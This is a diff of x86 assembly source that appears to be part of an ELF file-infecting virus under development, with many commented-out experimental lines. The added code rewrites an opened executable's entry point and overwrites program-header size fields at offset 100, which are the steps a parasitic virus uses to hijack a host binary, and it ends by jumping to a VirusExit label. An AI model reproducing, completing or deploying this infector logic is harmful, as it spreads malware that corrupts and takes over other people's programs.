@@ -54,6 +54,7 @@
 %define	STK_RES	200
 %define	RDWR	2
 %define	SEEK_END 2
+%define	SEEK_CUR 1
 %define SEEK_SET 0
 
 %define ENTRY		24
@@ -112,8 +113,10 @@ _start:
 		sub esi, 24
 		lseek dword [ebp-4], 0, SEEK_SET
 		
-
-		mov dword [esi+24], 0x08048294
+		mov ebx, 0x08049000
+		;add ebx, 223h
+		add ebx, dword [ebp-8]
+		mov dword [esi+24], ebx
 		;write STDOUT, esi, 4
 		;swrite STDOUT, _start, 4
 		;write STDOUT, esi, 52
@@ -124,7 +127,41 @@ _start:
 		sub esi, 60
 		write dword [ebp-4], esi, 52
 
-	;write STDOUT, ecx, 4
+
+	;load second program header
+	;mov ebx, 
+	;lseek dword [ebp-4], 0x1c, SEEK_SET
+	;read dword [ebp-4], dword [esi-4], 4
+	;lseek dword [ebp-4], dword [esi-4], SEEK_SET
+	;lseek dword [ebp-4], 0x20, SEEK_CUR
+	;lseek dword [ebp-4], 0x10, SEEK_CUR
+	;mov ebx, dword [esi-4]
+	;add ebx, 0x20
+	;add ebx, 0x10
+	;lseek dword [ebp-4], ebx, SEEK_SET
+	;lseek dword [ebp-4], 100, SEEK_SET
+	;sub esi, 4
+	;read dword [ebp-4], esi, 4
+	;add esi, 4
+	;mov edx, dword [ebp-8]
+	;add dword [esi-4], edx
+	lseek dword [ebp-4], 100, SEEK_SET
+	sub esi, 4
+	mov dword [esi], 0x00000f85
+	write dword [ebp-4], esi, 4
+	write dword [ebp-4], esi, 4
+	;add esi, 4
+
+	;lseek dword [ebp-4], -8, SEEK_CURR
+	;write dword [ebp-4], esi, 52
+
+
+	;add dword [ebx]
+
+	
+	sub esi, 32
+
+
 	close dword [ebp-4]
 	mov eax, 1
 	jmp VirusExit
